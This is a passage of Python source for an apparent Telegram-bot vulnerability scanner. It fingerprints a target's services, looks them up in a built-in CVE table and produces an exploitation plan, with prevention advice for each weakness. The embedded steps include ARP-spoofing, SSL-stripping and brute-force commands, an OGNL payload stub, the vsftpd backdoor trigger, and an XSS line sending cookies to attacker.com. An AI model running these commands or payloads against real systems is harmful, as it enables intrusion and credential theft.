"""
Advanced Vulnerability Scanner for Telegram Bot
Scans for known vulnerabilities, CVEs, and security issues
"""

import socket
import ssl
import requests
import asyncio
import aiohttp
import subprocess
import re
from datetime import datetime
from typing import Dict, List, Any, Optional
import json
import urllib.parse

class VulnerabilityScanner:
    def __init__(self):
        self.session = None
        self.common_ports = {
            21: 'FTP',
            22: 'SSH', 
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            993: 'IMAPS',
            995: 'POP3S'
        }
        
        # Detailed vulnerability database with exploitation methods and prevention
        self.vuln_database = {
            'ssl_version': {
                'title': 'Weak SSL/TLS Version',
                'description': 'שימוש בגרסאות TLS ישנות ולא מאובטחות',
                'exploitation': {
                    'method': 'Man-in-the-Middle (MITM) Attack',
                    'tools': ['sslscan', 'nmap --script ssl-enum-ciphers', 'testssl.sh'],
                    'steps': [
                        '1. סרוק עם: nmap --script ssl-enum-ciphers -p 443 <target>',
                        '2. זהה גרסאות TLS ישנות (1.0, 1.1)',
                        '3. השתמש ב-MITM tools כמו mitmproxy',
                        '4. נצל weakness בהצפנה לפענוח תעבורה'
                    ],
                    'impact': 'חשיפת מידע רגיש, סיסמאות, tokens'
                },
                'prevention': {
                    'immediate': [
                        'בטל TLS 1.0 ו-1.1 בשרת',
                        'אפשר רק TLS 1.2+ עם ciphers חזקים',
                        'עדכן הגדרות SSL במברי שירות'
                    ],
                    'configuration': 'ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;',
                    'testing': 'nmap --script ssl-enum-ciphers -p 443 <domain>',
                    'references': [
                        'https://tools.ietf.org/html/rfc8446',
                        'OWASP A6:2017 Security Misconfiguration'
                    ]
                }
            },
            'certificate_expiry': {
                'title': 'SSL Certificate Near Expiry',
                'description': 'תעודת SSL עומדת לפוג או פגה',
                'exploitation': {
                    'method': 'Service Disruption & Trust Issues',
                    'tools': ['openssl', 'curl', 'browser developer tools'],
                    'steps': [
                        '1. בדוק תוקף: openssl s_client -connect <domain>:443 | openssl x509 -noout -dates',
                        '2. המתן לפג התוקף',
                        '3. המשתמשים יקבלו אזהרות אבטחה',
                        '4. אפשרות ל-MITM עם certificate עצמי'
                    ],
                    'impact': 'הפרעה לשירות, אובדן אמון, פוטנציאל ל-MITM'
                },
                'prevention': {
                    'immediate': [
                        'חדש תעודה מיד',
                        'הגדר auto-renewal (Let\'s Encrypt)',
                        'מוניטור תוקף תעודות'
                    ],
                    'configuration': 'certbot --nginx -d domain.com או שימוש ב-ACME protocol',
                    'testing': 'curl -I https://domain.com || openssl x509 -in cert.pem -text -noout',
                    'references': [
                        'https://letsencrypt.org/docs/',
                        'RFC 5280 - X.509 Certificate'
                    ]
                }
            },
            'missing_hsts': {
                'title': 'Missing HSTS Header',
                'description': 'חסר Strict-Transport-Security header',
                'exploitation': {
                    'method': 'SSL Stripping Attack',
                    'tools': ['sslstrip', 'ettercap', 'bettercap'],
                    'steps': [
                        '1. התמקם ברשת (ARP spoofing): ettercap -T -M arp:remote /target_ip//',
                        '2. הפעל SSL stripping: sslstrip -l 8080',
                        '3. הפנה תעבורה: iptables redirect',
                        '4. המשתמש נכנס ל-HTTP במקום HTTPS',
                        '5. לכוד credentials בטקסט פתוח'
                    ],
                    'impact': 'חשיפת סיסמאות ומידע רגיש'
                },
                'prevention': {
                    'immediate': [
                        'הוסף HSTS header לכל תגובות HTTPS',
                        'כלול subdomains',
                        'הגדר preload directive'
                    ],
                    'configuration': 'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
                    'testing': 'curl -I https://domain.com | grep Strict-Transport-Security',
                    'references': [
                        'https://tools.ietf.org/html/rfc6797',
                        'OWASP HSTS Cheat Sheet'
                    ]
                }
            },
            'missing_csp': {
                'title': 'Missing Content Security Policy',
                'description': 'חסר Content-Security-Policy header',
                'exploitation': {
                    'method': 'XSS (Cross-Site Scripting) Attack',
                    'tools': ['XSSer', 'BeEF', 'Burp Suite', 'OWASP ZAP'],
                    'steps': [
                        '1. מצא input fields או URL parameters',
                        '2. נסה payload: <script>alert("XSS")</script>',
                        '3. אם successful, הזרק malicious script:',
                        '4. <script>document.location="http://attacker.com/steal.php?cookie="+document.cookie</script>',
                        '5. גנוב cookies, session tokens או בצע פעולות בשם המשתמש'
                    ],
                    'impact': 'גניבת session cookies, defacement, malware injection'
                },
                'prevention': {
                    'immediate': [
                        'הגדר CSP header מגביל',
                        'התחל עם report-only mode',
                        'הדק הגבלות בהדרגה'
                    ],
                    'configuration': 'Content-Security-Policy: default-src \'self\'; script-src \'self\'; style-src \'self\' \'unsafe-inline\';',
                    'testing': 'curl -I https://domain.com | grep Content-Security-Policy',
                    'references': [
                        'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP',
                        'OWASP XSS Prevention Cheat Sheet'
                    ]
                }
            },

            'security_headers': {
                'title': 'Missing Security Headers',
                'description': 'כותרות אבטחה חשובות חסרות',
                'exploitation': {
                    'method': 'Multiple Attack Vectors',
                    'tools': ['curl', 'OWASP ZAP', 'Burp Suite', 'browser dev tools'],
                    'steps': [
                        '1. בדיקת headers: curl -I https://target.com',
                        '2. זיהוי headers חסרים (HSTS, CSP, X-Frame-Options)',
                        '3. ניצול בהתאם לheader החסר:',
                        '   - חסר CSP: XSS attacks',
                        '   - חסר X-Frame-Options: Clickjacking',
                        '   - חסר HSTS: SSL stripping'
                    ],
                    'impact': 'XSS, clickjacking, SSL stripping, data theft'
                },
                'prevention': {
                    'immediate': [
                        'הוסף כל security headers הדרושים',
                        'בדוק compatibility עם browsers',
                        'מוניטור headers באופן קבוע'
                    ],
                    'configuration': 'X-Frame-Options: DENY; X-Content-Type-Options: nosniff; X-XSS-Protection: 1; mode=block',
                    'testing': 'curl -I https://domain.com | grep -E "(X-Frame|X-Content|X-XSS|Strict-Transport)"',
                    'references': [
                        'OWASP Secure Headers Project',
                        'Mozilla Security Guidelines'
                    ]
                }
            },
            'server_info': {
                'title': 'Server Information Disclosure',
                'description': 'חשיפת מידע על השרת ב-headers',
                'exploitation': {
                    'method': 'Information Gathering & Targeted Attacks',
                    'tools': ['curl', 'nmap', 'nikto', 'whatweb'],
                    'steps': [
                        '1. בדיקת headers: curl -I http://target.com',
                        '2. זיהוי גרסת שרת: Server: Apache/2.4.18',
                        '3. חיפוש CVEs: searchsploit apache 2.4.18',
                        '4. שימוש ב-exploits ידועים לגרסה זו',
                        '5. ניצול פגיעויות ספציפיות לגרסה'
                    ],
                    'impact': 'מידע לתוקפים, targeted exploits, fingerprinting'
                },
                'prevention': {
                    'immediate': [
                        'הסתר או שנה Server header',
                        'השבת directory listing',
                        'הסר version information'
                    ],
                    'configuration': 'Apache: ServerTokens Prod; Nginx: server_tokens off;',
                    'testing': 'curl -I http://domain.com | grep Server',
                    'references': [
                        'OWASP A6:2017 Security Misconfiguration',
                        'CWE-200: Information Exposure'
                    ]
                }
            },
            'insecure_ftp': {
                'title': 'Insecure FTP Service',
                'description': 'שירות FTP פתוח העובר בטקסט פתוח',
                'exploitation': {
                    'method': 'Credential Sniffing & Brute Force',
                    'tools': ['wireshark', 'hydra', 'ncrack', 'medusa'],
                    'steps': [
                        '1. סריקת פורטים: nmap -sV -p 21 <target>',
                        '2. בדיקת anonymous login: ftp <target> (username: anonymous)',
                        '3. Packet sniffing: wireshark על פורט 21',
                        '4. Brute force: hydra -l admin -P passwords.txt ftp://<target>',
                        '5. אם נמצא access - גישה לקבצים, העלאה של backdoors'
                    ],
                    'impact': 'גישה לקבצים רגישים, העלאת malware, data exfiltration'
                },
                'prevention': {
                    'immediate': [
                        'סגור FTP או החלף ב-SFTP/FTPS',
                        'אם חייב FTP - הגבל IP addresses',
                        'השבת anonymous login'
                    ],
                    'configuration': 'ssh/sftp: Port 22, או vsftpd עם SSL/TLS',
                    'testing': 'nmap -sV -p 21 <target> && ftp <target>',
                    'references': [
                        'OWASP A6:2017 Security Misconfiguration',
                        'CWE-319: Cleartext Transmission'
                    ]
                }
            },
            'insecure_telnet': {
                'title': 'Insecure Telnet Service',
                'description': 'שירות Telnet פתוח העובר בטקסט פתוח',
                'exploitation': {
                    'method': 'Credential Interception & Remote Access',
                    'tools': ['telnet', 'wireshark', 'ncrack', 'patator'],
                    'steps': [
                        '1. גילוי השירות: nmap -sV -p 23 <target>',
                        '2. ניסיון התחברות: telnet <target>',
                        '3. Packet capture: tcpdump -i eth0 port 23 -A',
                        '4. Brute force: ncrack -p 23 --user admin -P passwords.txt <target>',
                        '5. אם successful - shell access מלא למערכת'
                    ],
                    'impact': 'השתלטות מלאה על המערכת, גניבת מידע, lateral movement'
                },
                'prevention': {
                    'immediate': [
                        'השבת Telnet לחלוטין',
                        'החלף ב-SSH (port 22)',
                        'חסום פורט 23 ב-firewall'
                    ],
                    'configuration': 'systemctl disable telnet && systemctl enable ssh',
                    'testing': 'nmap -sV -p 23 <target>',
                    'references': [
                        'NIST SP 800-53 SC-8',
                        'CWE-319: Cleartext Transmission'
                    ]
                }
            },
            'information_disclosure': {
                'title': 'Server Information Disclosure',
                'description': 'חשיפת מידע על השרת ב-headers',
                'exploitation': {
                    'method': 'Information Gathering & Targeted Attacks',
                    'tools': ['curl', 'nmap', 'nikto', 'whatweb'],
                    'steps': [
                        '1. בדיקת headers: curl -I http://target.com',
                        '2. זיהוי גרסת שרת: Server: Apache/2.4.18',
                        '3. חיפוש CVEs: searchsploit apache 2.4.18',
                        '4. שימוש ב-exploits ידועים לגרסה זו',
                        '5. ניצול פגיעויות ספציפיות לגרסה'
                    ],
                    'impact': 'מידע לתוקפים, targeted exploits, fingerprinting'
                },
                'prevention': {
                    'immediate': [
                        'הסתר או שנה Server header',
                        'השבת directory listing',
                        'הסר version information'
                    ],
                    'configuration': 'Apache: ServerTokens Prod; Nginx: server_tokens off;',
                    'testing': 'curl -I http://domain.com | grep Server',
                    'references': [
                        'OWASP A6:2017 Security Misconfiguration',
                        'CWE-200: Information Exposure'
                    ]
                }
            }
        }
        
        # Common vulnerabilities to check
        self.vuln_checks = [
            'ssl_vulnerabilities',
            'http_headers_security', 
            'open_ports_analysis',
            'service_version_check',
            'weak_ciphers',
            'certificate_validation'
        ]
    
    async def analyze_website_exploits(self, target: str) -> Dict[str, Any]:
        """Analyze website and find specific exploits from Exploit-DB"""
        results = {
            'target': target,
            'scan_time': datetime.now().isoformat(),
            'detected_services': [],
            'potential_exploits': [],
            'exploitation_plan': [],
            'severity_score': 0
        }
        
        try:
            # Get detailed service information
            service_info = await self._get_detailed_service_info(target)
            results['detected_services'] = service_info
            
            # Search for specific exploits for each detected service
            for service in service_info:
                exploits = await self._search_targeted_exploits(service)
                results['potential_exploits'].extend(exploits)
            
            # Generate exploitation plan
            results['exploitation_plan'] = await self._generate_exploitation_plan(results['potential_exploits'])
            
            # Calculate severity
            results['severity_score'] = self._calculate_exploit_severity(results['potential_exploits'])
            
        except Exception as e:
            results['error'] = f"Analysis failed: {str(e)}"
            
        return results

    async def _get_detailed_service_info(self, target: str) -> List[Dict[str, Any]]:
        """Get detailed information about services running on target"""
        services = []
        
        try:
            # HTTP/HTTPS detection
            for protocol in ['http', 'https']:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f'{protocol}://{target}', timeout=10) as response:
                            headers = dict(response.headers)
                            
                            service_info = {
                                'protocol': protocol,
                                'port': 443 if protocol == 'https' else 80,
                                'service': 'web',
                                'headers': headers,
                                'status': response.status
                            }
                            
                            # Extract server information
                            if 'Server' in headers:
                                server = headers['Server']
                                service_info['server'] = server
                                service_info['server_parsed'] = self._parse_server_header(server)
                            
                            # Check for specific technologies
                            service_info['technologies'] = await self._detect_technologies(target, headers, protocol)
                            
                            services.append(service_info)
                            break  # If HTTPS works, prefer it
                except:
                    continue
            
            # Port scanning for common services
            common_ports = {21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 
                           53: 'dns', 80: 'http', 443: 'https', 993: 'imaps', 995: 'pop3s'}
            
            target_ip = await self._resolve_target(target)
            for port, service_name in common_ports.items():
                if await self._check_port_open(target_ip, port):
                    version_info = await self._get_service_version(target_ip, port, service_name)
                    services.append({
                        'port': port,
                        'service': service_name,
                        'version_info': version_info,
                        'status': 'open'
                    })
        except Exception as e:
            pass
            
        return services

    def _parse_server_header(self, server_header: str) -> Dict[str, str]:
        """Parse server header to extract software and version"""
        parsed = {}
        
        # Common patterns
        patterns = {
            r'Apache/([0-9.]+)': 'Apache',
            r'nginx/([0-9.]+)': 'Nginx', 
            r'Microsoft-IIS/([0-9.]+)': 'IIS',
            r'Apache-Coyote/([0-9.]+)': 'Tomcat',
            r'OpenSSH_([0-9.]+)': 'OpenSSH'
        }
        
        for pattern, software in patterns.items():
            match = re.search(pattern, server_header, re.IGNORECASE)
            if match:
                parsed['software'] = software
                parsed['version'] = match.group(1)
                break
        
        if not parsed:
            parsed['raw'] = server_header
            
        return parsed

    async def _detect_technologies(self, target: str, headers: Dict[str, str], protocol: str) -> List[Dict[str, str]]:
        """Detect web technologies and frameworks"""
        technologies = []
        
        # Check headers for technology indicators
        tech_indicators = {
            'X-Powered-By': {
                'PHP': r'PHP/([0-9.]+)',
                'ASP.NET': r'ASP\.NET',
                'Express': r'Express'
            },
            'Set-Cookie': {
                'PHPSESSID': 'PHP',
                'JSESSIONID': 'Java/JSP',
                'ASP.NET_SessionId': 'ASP.NET'
            }
        }
        
        for header, indicators in tech_indicators.items():
            if header in headers:
                header_value = headers[header]
                for tech, pattern in indicators.items():
                    if isinstance(pattern, str):
                        if pattern in header_value:
                            technologies.append({'name': tech, 'detected_by': f'{header} header'})
                    else:
                        match = re.search(pattern, header_value)
                        if match:
                            version = match.group(1) if match.groups() else 'unknown'
                            technologies.append({
                                'name': tech,
                                'version': version,
                                'detected_by': f'{header} header'
                            })
        
        # Try to detect from response body (limited check)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'{protocol}://{target}', timeout=5) as response:
                    body = await response.text()
                    body_lower = body.lower()
                    
                    # WordPress detection
                    if 'wp-content' in body_lower or 'wordpress' in body_lower:
                        wp_version = self._extract_wordpress_version(body)
                        technologies.append({
                            'name': 'WordPress',
                            'version': wp_version,
                            'detected_by': 'content analysis'
                        })
                    
                    # Joomla detection  
                    if 'joomla' in body_lower or '/components/com_' in body_lower:
                        technologies.append({
                            'name': 'Joomla',
                            'detected_by': 'content analysis'
                        })
                    
                    # Drupal detection
                    if 'drupal' in body_lower or '/sites/all/' in body_lower:
                        technologies.append({
                            'name': 'Drupal',
                            'detected_by': 'content analysis'
                        })
        except:
            pass
            
        return technologies

    def _extract_wordpress_version(self, body: str) -> str:
        """Extract WordPress version from HTML"""
        patterns = [
            r'wp-includes.*?ver=([0-9.]+)',
            r'wordpress.*?([0-9.]+)',
            r'generator.*?wordpress ([0-9.]+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return 'unknown'

    async def _search_targeted_exploits(self, service_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Search for targeted exploits based on detected service information"""
        exploits = []
        
        # Check server software
        if 'server_parsed' in service_info:
            server = service_info['server_parsed']
            if 'software' in server and 'version' in server:
                software = server['software'].lower()
                version = server['version']
                exploits.extend(await self._find_exploits_by_software(software, version))
        
        # Check web technologies
        if 'technologies' in service_info:
            for tech in service_info['technologies']:
                tech_name = tech['name'].lower()
                tech_version = tech.get('version', '')
                exploits.extend(await self._find_exploits_by_software(tech_name, tech_version))
        
        # Check service-specific exploits
        service_name = service_info.get('service', '')
        if service_name and 'version_info' in service_info:
            version_info = service_info['version_info']
            exploits.extend(await self._find_exploits_by_service(service_name, version_info))
        
        return exploits

    async def _find_exploits_by_software(self, software: str, version: str) -> List[Dict[str, Any]]:
        """Find exploits for specific software and version"""
        exploits = []
        
        # Enhanced exploit database with more specific version targeting
        software_exploits = {
            'apache': [
                {
                    'title': 'Apache HTTP Server Range Header DoS (Killer Apache)',
                    'cve': 'CVE-2011-3192',
                    'versions_affected': ['2.0.x', '2.2.x'],
                    'severity': 'Medium',
                    'description': 'DoS attack דרך Range headers מרובים',
                    'exploitation': {
                        'method': 'HTTP Range Header Attack',
                        'difficulty': 'Easy',
                        'tools': ['curl', 'slowhttptest', 'custom script'],
                        'payload': 'Range: bytes=0-1023,1024-2047,2048-3071...',
                        'steps': [
                            'שלח בקשת HTTP עם Range headers מרובים',
                            'השרת יצרוך זיכרון רב לכל range',
                            'המשך לשלוח בקשות עד קריסת השרת'
                        ],
                        'impact': 'השרת נופל, שירות לא זמין, צריכת זיכרון יתר'
                    },
                    'detection': 'תגובת 206 Partial Content או timeout בשרת',
                    'fix': 'עדכון לגרסה חדשה או הגדרת mod_headers'
                },
                {
                    'title': 'Apache Struts 2 Remote Code Execution',
                    'cve': 'CVE-2017-5638',
                    'versions_affected': ['2.3.5-2.3.31', '2.5-2.5.10'],
                    'severity': 'Critical',
                    'description': 'ביצוע קוד מרוחק דרך Content-Type header',
                    'exploitation': {
                        'method': 'OGNL Injection',
                        'difficulty': 'Medium',
                        'tools': ['Metasploit', 'Burp Suite', 'custom payload'],
                        'payload': '%{(#_=\'multipart/form-data\').(#[malicious_code])}',
                        'steps': [
                            'זהה אפליקציית Struts',
                            'שלח Content-Type עם OGNL payload',
                            'הפעל קוד על השרת'
                        ],
                        'impact': 'השתלטות מלאה על השרת, גניבת מידע'
                    },
                    'detection': 'שרת מגיב לOGNL expressions ב-headers',
                    'fix': 'עדכון מיידי ל-Struts 2.3.32 או 2.5.10.1'
                }
            ],
            'nginx': [
                {
                    'title': 'Nginx Integer Overflow Denial of Service',
                    'cve': 'CVE-2013-2028',
                    'versions_affected': ['0.8.41-1.4.0', '1.5.0'],
                    'severity': 'High',
                    'description': 'גלישת מספר שלם בטיפול בchunked encoding',
                    'exploitation': {
                        'method': 'Chunked Transfer Encoding Attack',
                        'difficulty': 'Medium',
                        'tools': ['curl', 'custom HTTP client'],
                        'payload': 'Chunk size: FFFFFFF0',
                        'steps': [
                            'שלח HTTP request עם chunked encoding',
                            'הגדר chunk size גדול מדי',
                            'גרום לoverflow במספר השלם'
                        ],
                        'impact': 'קריסת worker process, DoS'
                    },
                    'detection': 'השרת קורס עם chunked requests מסוימים',
                    'fix': 'עדכון ל-Nginx 1.4.1+ או 1.5.1+'
                }
            ],
            'wordpress': [
                {
                    'title': 'WordPress REST API User Enumeration',
                    'cve': 'CVE-2017-5487',
                    'versions_affected': ['4.7.0', '4.7.1'],
                    'severity': 'Medium',
                    'description': 'חשיפת רשימת משתמשים דרך REST API',
                    'exploitation': {
                        'method': 'REST API Enumeration',
                        'difficulty': 'Easy',
                        'tools': ['curl', 'wpscan', 'browser'],
                        'payload': 'GET /wp-json/wp/v2/users',
                        'steps': [
                            'גש ל-/wp-json/wp/v2/users',
                            'קבל רשימת משתמשים ומידע עליהם',
                            'השתמש במידע לbrute force'
                        ],
                        'impact': 'חשיפת שמות משתמש, מידע אישי'
                    },
                    'detection': 'API מחזיר רשימת משתמשים ללא אימות',
                    'fix': 'עדכון ל-4.7.2 או השבתת REST API'
                },
                {
                    'title': 'WordPress Plugin SQL Injection',
                    'cve': 'Various',
                    'versions_affected': ['Multiple plugins'],
                    'severity': 'Critical',
                    'description': 'SQL injection בפלאגינים פופולריים',
                    'exploitation': {
                        'method': 'SQL Injection',
                        'difficulty': 'Medium',
                        'tools': ['SQLMap', 'Burp Suite', 'manual testing'],
                        'payload': '\' OR 1=1 --',
                        'steps': [
                            'זהה פלאגין חשוד',
                            'מצא parameter שמתחבר לDB',
                            'הזרק SQL code'
                        ],
                        'impact': 'גישה למסד הנתונים, גניבת מידע'
                    },
                    'detection': 'שגיאות SQL או התנהגות חריגה',
                    'fix': 'עדכון פלאגינים, הסרת פלאגינים לא מעודכנים'
                }
            ],
            'php': [
                {
                    'title': 'PHP Remote Code Execution',
                    'cve': 'CVE-2019-11043',
                    'versions_affected': ['7.1.x-7.3.x with php-fpm + nginx'],
                    'severity': 'Critical',
                    'description': 'ביצוע קוד מרוחק בconfiguration מסוימת',
                    'exploitation': {
                        'method': 'Path Info Manipulation',
                        'difficulty': 'Hard',
                        'tools': ['Custom exploit', 'Metasploit'],
                        'payload': 'Specially crafted URL path',
                        'steps': [
                            'זהה PHP-FPM + Nginx setup',
                            'שלח URL עם path info מיוחד',
                            'גרום להרצת קוד PHP שרירותי'
                        ],
                        'impact': 'השתלטות מלאה על השרת'
                    },
                    'detection': 'התנהגות חריגה עם URLs מיוחדים',
                    'fix': 'עדכון PHP או שינוי הגדרות nginx'
                }
            ]
        }
        
        # Search for matching exploits
        if software in software_exploits:
            for exploit in software_exploits[software]:
                # Check if version is affected
                if self._is_version_affected(version, exploit.get('versions_affected', [])):
                    exploits.append(exploit)
        
        return exploits

    def _is_version_affected(self, target_version: str, affected_versions: List[str]) -> bool:
        """Check if target version is in affected versions list"""
        if not target_version or not affected_versions:
            return True  # Assume vulnerable if version unknown
            
        for affected in affected_versions:
            if 'x' in affected:
                # Handle version ranges like "2.3.x"
                base_version = affected.replace('.x', '')
                if target_version.startswith(base_version):
                    return True
            elif '-' in affected:
                # Handle version ranges like "2.3.5-2.3.31"  
                start_version, end_version = affected.split('-')
                # Simple string comparison (would need proper version parsing for production)
                if start_version <= target_version <= end_version:
                    return True
            elif affected == target_version:
                return True
                
        return False

    async def _generate_exploitation_plan(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Generate step-by-step exploitation plan"""
        plan = []
        
        # Sort exploits by severity and difficulty
        sorted_exploits = sorted(exploits, key=lambda x: (
            {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3}.get(x.get('severity', 'Low'), 3),
            {'Easy': 0, 'Medium': 1, 'Hard': 2}.get(x.get('exploitation', {}).get('difficulty', 'Hard'), 2)
        ))
        
        for i, exploit in enumerate(sorted_exploits[:3], 1):  # Top 3 exploits
            exploitation = exploit.get('exploitation', {})
            plan_step = {
                'step': i,
                'target': exploit.get('title', 'Unknown'),
                'cve': exploit.get('cve', 'N/A'),
                'difficulty': exploitation.get('difficulty', 'Unknown'),
                'method': exploitation.get('method', 'Unknown'),
                'tools_needed': exploitation.get('tools', []),
                'steps': exploitation.get('steps', []),
                'expected_impact': exploitation.get('impact', 'Unknown'),
                'detection_signs': exploit.get('detection', 'Unknown')
            }
            plan.append(plan_step)
            
        return plan

    def _calculate_exploit_severity(self, exploits: List[Dict[str, Any]]) -> int:
        """Calculate overall severity score based on found exploits"""
        if not exploits:
            return 100  # No exploits found = good score
            
        severity_weights = {'Critical': 0, 'High': 25, 'Medium': 60, 'Low': 80}
        total_weight = 0
        count = 0
        
        for exploit in exploits:
            severity = exploit.get('severity', 'Low')
            total_weight += severity_weights.get(severity, 80)
            count += 1
            
        return total_weight // count if count > 0 else 100

    async def search_known_exploits(self, service_info: str, version: str = "") -> List[Dict[str, Any]]:
        """Search for known exploits using service information"""
        exploits = []
        
        try:
            # Common exploit patterns based on service info
            exploit_db = {
                'apache': {
                    'patterns': ['apache', 'httpd'],
                    'common_exploits': [
                        {
                            'title': 'Apache HTTP Server Range Header DoS',
                            'cve': 'CVE-2011-3192',
                            'description': 'כשל בטיפול ב-Range headers יכול לגרום ל-DoS',
                            'exploitation': {
                                'method': 'HTTP Range Header Attack',
                                'tools': ['slowhttptest', 'curl', 'custom scripts'],
                                'payload': 'Range: bytes=0-1023, 1024-2047, 2048-3071...',
                                'impact': 'Server crash, memory exhaustion'
                            },
                            'versions_affected': '1.3.x, 2.0.x, 2.2.x',
                            'severity': 'Medium'
                        },
                        {
                            'title': 'Apache Struts RCE',
                            'cve': 'CVE-2017-5638',
                            'description': 'ביצוע קוד מרוחק דרך Content-Type header',
                            'exploitation': {
                                'method': 'OGNL Injection',
                                'tools': ['Metasploit', 'custom exploit'],
                                'payload': '%{(#_=\'multipart/form-data\').(#[payload])}',
                                'impact': 'Full system compromise'
                            },
                            'versions_affected': 'Struts 2.3.5-2.3.31, 2.5-2.5.10',
                            'severity': 'Critical'
                        }
                    ]
                },
                'nginx': {
                    'patterns': ['nginx'],
                    'common_exploits': [
                        {
                            'title': 'Nginx Integer Overflow',
                            'cve': 'CVE-2013-2028',
                            'description': 'גלישת מספר שלם בטיפול בגודל chunk',
                            'exploitation': {
                                'method': 'Chunked Transfer Encoding Attack',
                                'tools': ['custom scripts', 'curl'],
                                'payload': 'Specially crafted chunk size',
                                'impact': 'Worker process crash, potential RCE'
                            },
                            'versions_affected': '0.8.41-1.4.0, 1.5.0',
                            'severity': 'High'
                        }
                    ]
                },
                'openssh': {
                    'patterns': ['openssh', 'ssh'],
                    'common_exploits': [
                        {
                            'title': 'OpenSSH User Enumeration',
                            'cve': 'CVE-2016-6210',
                            'description': 'זיהוי משתמשים קיימים דרך timing attack',
                            'exploitation': {
                                'method': 'Timing Side-Channel Attack',
                                'tools': ['ssh-user-enum', 'custom scripts'],
                                'payload': 'Multiple login attempts with timing analysis',
                                'impact': 'Username enumeration'
                            },
                            'versions_affected': 'Before 7.3',
                            'severity': 'Low'
                        },
                        {
                            'title': 'OpenSSH MaxStartups DoS',
                            'cve': 'CVE-2010-5107',
                            'description': 'מניעת חיבורים חדשים דרך MaxStartups',
                            'exploitation': {
                                'method': 'Connection Exhaustion',
                                'tools': ['ssh', 'custom scripts'],
                                'payload': 'Multiple concurrent connections',
                                'impact': 'Service unavailability'
                            },
                            'versions_affected': 'Multiple versions',
                            'severity': 'Medium'
                        }
                    ]
                },
                'ftp': {
                    'patterns': ['ftp', 'vsftpd', 'proftpd'],
                    'common_exploits': [
                        {
                            'title': 'VSFTPD Backdoor',
                            'cve': 'CVE-2011-2523',
                            'description': 'backdoor במהדורה 2.3.4 של vsftpd',
                            'exploitation': {
                                'method': 'Backdoor Activation',
                                'tools': ['Metasploit', 'netcat'],
                                'payload': 'USER test:) or *(Smiley face)',
                                'impact': 'Root shell access on port 6200'
                            },
                            'versions_affected': 'vsftpd 2.3.4',
                            'severity': 'Critical'
                        }
                    ]
                },
                'mysql': {
                    'patterns': ['mysql'],
                    'common_exploits': [
                        {
                            'title': 'MySQL Root Privilege Escalation',
                            'cve': 'CVE-2016-6664',
                            'description': 'העלאת הרשאות לroot דרך race condition',
                            'exploitation': {
                                'method': 'Race Condition Attack',
                                'tools': ['mysql', 'custom exploit'],
                                'payload': 'Specially crafted SQL + file operations',
                                'impact': 'Root privilege escalation'
                            },
                            'versions_affected': '5.5.x, 5.6.x, 5.7.x',
                            'severity': 'High'
                        }
                    ]
                },
                'iis': {
                    'patterns': ['iis', 'microsoft-iis'],
                    'common_exploits': [
                        {
                            'title': 'IIS 6.0 WebDAV Buffer Overflow',
                            'cve': 'CVE-2017-7269',
                            'description': 'גלישת buffer ב-WebDAV PROPFIND',
                            'exploitation': {
                                'method': 'Stack Buffer Overflow',
                                'tools': ['Metasploit', 'custom exploit'],
                                'payload': 'Long PROPFIND request with shellcode',
                                'impact': 'Remote code execution as SYSTEM'
                            },
                            'versions_affected': 'IIS 6.0 on Windows 2003',
                            'severity': 'Critical'
                        }
                    ]
                }
            }
            
            # Search for matching exploits
            service_lower = service_info.lower()
            for service, data in exploit_db.items():
                for pattern in data['patterns']:
                    if pattern in service_lower:
                        for exploit in data['common_exploits']:
                            # Check if version is affected if version is provided
                            if version and 'versions_affected' in exploit:
                                # Simple version check - in real implementation would be more sophisticated
                                exploits.append(exploit)
                            else:
                                exploits.append(exploit)
                        break
                        
        except Exception as e:
            pass
            
        return exploits

    async def _find_exploits_by_service(self, service_name: str, version_info: str) -> List[Dict[str, Any]]:
        """Find exploits for specific service"""
        exploits = []
        
        service_exploits = {
            'ssh': [
                {
                    'title': 'OpenSSH User Enumeration',
                    'cve': 'CVE-2016-6210',
                    'versions_affected': ['Before 7.3'],
                    'severity': 'Low',
                    'description': 'זיהוי משתמשים קיימים דרך timing attack',
                    'exploitation': {
                        'method': 'Timing Side-Channel Attack',
                        'difficulty': 'Medium',
                        'tools': ['ssh-user-enum', 'custom scripts'],
                        'steps': [
                            'בצע ניסיונות התחברות עם שמות משתמש שונים',
                            'מדוד זמני תגובה',
                            'זהה הבדלים בזמנים'
                        ],
                        'impact': 'חשיפת שמות משתמש קיימים'
                    }
                }
            ],
            'ftp': [
                {
                    'title': 'VSFTPD Backdoor Command Execution', 
                    'cve': 'CVE-2011-2523',
                    'versions_affected': ['vsftpd 2.3.4'],
                    'severity': 'Critical',
                    'description': 'backdoor במהדורה זו של vsftpd',
                    'exploitation': {
                        'method': 'Backdoor Trigger',
                        'difficulty': 'Easy',
                        'tools': ['telnet', 'netcat', 'Metasploit'],
                        'steps': [
                            'התחבר לפורט 21 עם username המכיל :)',
                            'השרת יפתח backdoor על פורט 6200', 
                            'התחבר לפורט 6200 לקבלת shell'
                        ],
                        'impact': 'root shell על השרת'
                    }
                }
            ]
        }
        
        if service_name.lower() in service_exploits:
            exploits.extend(service_exploits[service_name.lower()])
            
        return exploits

    async def _check_port_open(self, host: str, port: int) -> bool:
        """Check if a port is open"""
        try:
            loop = asyncio.get_event_loop()
            future = asyncio.open_connection(host, port)
            reader, writer = await asyncio.wait_for(future, timeout=3.0)
            writer.close()
            await writer.wait_closed()
            return True
        except:
            return False

    async def _get_service_version(self, host: str, port: int, service: str) -> str:
        """Get service version information"""
        try:
            if service == 'ssh' and port == 22:
                # Try to get SSH banner
                loop = asyncio.get_event_loop()
                future = asyncio.open_connection(host, port)
                reader, writer = await asyncio.wait_for(future, timeout=5.0)
                banner = await asyncio.wait_for(reader.readline(), timeout=3.0)
                writer.close()
                await writer.wait_closed()
